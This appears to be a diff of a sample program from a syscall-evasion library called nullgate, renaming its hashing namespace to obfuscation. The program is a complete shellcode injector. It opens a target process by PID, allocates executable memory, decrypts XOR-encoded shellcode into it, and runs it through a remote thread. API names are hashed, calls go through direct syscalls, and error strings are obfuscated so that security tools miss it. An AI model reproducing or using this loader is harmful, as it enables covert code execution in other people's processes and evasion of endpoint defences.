@@ -1,11 +1,13 @@
 #include <ntdef.h>
-#include <nullgate/hashing.hpp>
+#include <nullgate/obfuscation.hpp>
 #include <nullgate/syscalls.hpp>
 #include <sample/ntapi.hpp>
 #include <stdexcept>
 #include <string>
 #include <windows.h>
 #include <winnt.h>
+
+namespace ng = nullgate;
 
 int main(int argc, char *argv[]) {
   const size_t shellcodeSize = 276; // Size of shellcode before encryption
@@ -25,32 +27,32 @@ int main(int argc, char *argv[]) {
 
   if (argc != 2)
     throw std::runtime_error(
-        nullgate::hashing::xorDecode("ERQeIVR6MEQ/akg8PC01LCg="));
+        ng::obfuscation::xorDecode("ERQeIVR6MEQ/akg8PC01LCg="));
 
-  nullgate::syscalls syscalls;
+  ng::syscalls syscalls;
   DWORD PID = std::stoi(argv[1]);
   HANDLE processHandle = NULL;
   OBJECT_ATTRIBUTES objectAttrs = {sizeof(objectAttrs), NULL};
   CLIENT_ID clientId = {.UniqueProcess = (HANDLE)PID, .UniqueThread = NULL};
   auto status =
-      syscalls.Call(nullgate::hashing::fnv1Const("NtOpenProcess"),
-                    &processHandle, PROCESS_ALL_ACCESS, objectAttrs, clientId);
+      syscalls.Call(ng::obfuscation::fnv1Const("NtOpenProcess"), &processHandle,
+                    PROCESS_ALL_ACCESS, objectAttrs, clientId);
   if (!NT_SUCCESS(status))
     throw std::runtime_error(
-        nullgate::hashing::xorDecode("BQkEI1c0dkJ4LU4naSJhGCcIFSNWej5YeD5DNmkzM"
-                                     "x8lAwI8H3o3VzEmTjdpNCgELlxR") +
+        ng::obfuscation::xorDecode("BQkEI1c0dkJ4LU4naSJhGCcIFSNWej5YeD5DNmkzM"
+                                   "x8lAwI8H3o3VzEmTjdpNCgELlxR") +
         std::to_string(status));
 
   PVOID buf = NULL;
   size_t regionSize = shellcodeSize;
-  status = syscalls.Call(
-      nullgate::hashing::fnv1Const("NtAllocateVirtualMemory"), processHandle,
-      &buf, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  status = syscalls.Call(ng::obfuscation::fnv1Const("NtAllocateVirtualMemory"),
+                         processHandle, &buf, 0, &regionSize,
+                         MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   if (!NT_SUCCESS(status)) {
-    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
+    syscalls.Call(ng::obfuscation::fnv1Const("NtClose"), processHandle);
     throw std::runtime_error(
-        nullgate::hashing::xorDecode("BQkEI1c0dkJ4LU4naTEkAyMUByoTNzRbNzhScyAtY"
-                                     "QQuA1E/QTUyUys5B3MvIigcIwJROFouOQx4") +
+        ng::obfuscation::xorDecode("BQkEI1c0dkJ4LU4naTEkAyMUByoTNzRbNzhScyAtY"
+                                   "QQuA1E/QTUyUys5B3MvIigcIwJROFouOQx4") +
         std::to_string(status));
   }
 
@@ -58,11 +60,11 @@ int main(int argc, char *argv[]) {
   // it didn't work for me)
   const char fakebuf[] = "pwned";
   status =
-      syscalls.Call(nullgate::hashing::fnv1Const("NtWriteVirtualMemory"),
+      syscalls.Call(ng::obfuscation::fnv1Const("NtWriteVirtualMemory"),
                     processHandle, buf, (void *)fakebuf, sizeof(fakebuf), NULL);
   if (!NT_SUCCESS(status)) {
-    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
-    throw std::runtime_error(nullgate::hashing::xorDecode(
+    syscalls.Call(ng::obfuscation::fnv1Const("NtClose"), processHandle);
+    throw std::runtime_error(ng::obfuscation::xorDecode(
                                  "BQkEI1c0dkJ4LU4naTQzGTIDUSJWNz5EIWpCPWk3LlAyD"
                                  "hRvQyg+VT05WH9pJSAZKgMVb0QzJV5iag==") +
                              std::to_string(status));
@@ -70,44 +72,44 @@ int main(int argc, char *argv[]) {
 
   HANDLE threadHandle = NULL;
   status =
-      syscalls.Call(nullgate::hashing::fnv1Const("NtCreateThreadEx"),
+      syscalls.Call(ng::obfuscation::fnv1Const("NtCreateThreadEx"),
                     &threadHandle, THREAD_ALL_ACCESS, &objectAttrs,
                     processHandle, buf, CREATE_SUSPENDED, 0, 0, 0, 0, NULL);
   if (!NT_SUCCESS(status)) {
-    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
+    syscalls.Call(ng::obfuscation::fnv1Const("NtClose"), processHandle);
     throw std::runtime_error(
-        nullgate::hashing::xorDecode("BQkEI1c0dkJ4KVk2KDckUCgDBm9HMiNTOS4LOidjN"
-                                     "RgjRgE9XDk0RStmCzUoKi0VIkYGJkcyaxY=") +
+        ng::obfuscation::xorDecode("BQkEI1c0dkJ4KVk2KDckUCgDBm9HMiNTOS4LOidjN"
+                                   "RgjRgE9XDk0RStmCzUoKi0VIkYGJkcyaxY=") +
         std::to_string(status));
   }
 
-  auto decryptedShellcode = nullgate::hashing::hex2bin(
-      nullgate::hashing::xorDecode(encryptedShellcode));
-  status = syscalls.Call(nullgate::hashing::fnv1Const("NtWriteVirtualMemory"),
+  auto decryptedShellcode =
+      ng::obfuscation::hex2bin(ng::obfuscation::xorDecode(encryptedShellcode));
+  status = syscalls.Call(ng::obfuscation::fnv1Const("NtWriteVirtualMemory"),
                          processHandle, buf, (void *)decryptedShellcode.data(),
                          decryptedShellcode.size(), NULL);
   if (!NT_SUCCESS(status)) {
-    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
-    throw std::runtime_error(nullgate::hashing::xorDecode(
+    syscalls.Call(ng::obfuscation::fnv1Const("NtClose"), processHandle);
+    throw std::runtime_error(ng::obfuscation::xorDecode(
                                  "BQkEI1c0dkJ4LU4naTQzGTIDUSJWNz5EIWpCPWk3LlAyD"
                                  "hRvQyg+VT05WH9pJSAZKgMVb0QzJV5iag==") +
                              std::to_string(status));
   }
 
-  status = syscalls.Call(nullgate::hashing::fnv1Const("NtResumeThread"),
+  status = syscalls.Call(ng::obfuscation::fnv1Const("NtResumeThread"),
                          threadHandle, NULL);
   if (!NT_SUCCESS(status)) {
-    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
-    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), threadHandle);
+    syscalls.Call(ng::obfuscation::fnv1Const("NtClose"), processHandle);
+    syscalls.Call(ng::obfuscation::fnv1Const("NtClose"), threadHandle);
     throw std::runtime_error(
-        nullgate::hashing::xorDecode(
+        ng::obfuscation::xorDecode(
             "BQkEI1c0dkJ4OE4gPC4kUDIOAypSPn0WPitCPywnYQcvEhl1Ew==") +
         std::to_string(status));
   }
 
-  syscalls.Call(nullgate::hashing::fnv1Const("NtWaitForSingleObject"),
+  syscalls.Call(ng::obfuscation::fnv1Const("NtWaitForSingleObject"),
                 threadHandle, INFINITE);
 
-  syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), threadHandle);
-  syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
+  syscalls.Call(ng::obfuscation::fnv1Const("NtClose"), threadHandle);
+  syscalls.Call(ng::obfuscation::fnv1Const("NtClose"), processHandle);
 }
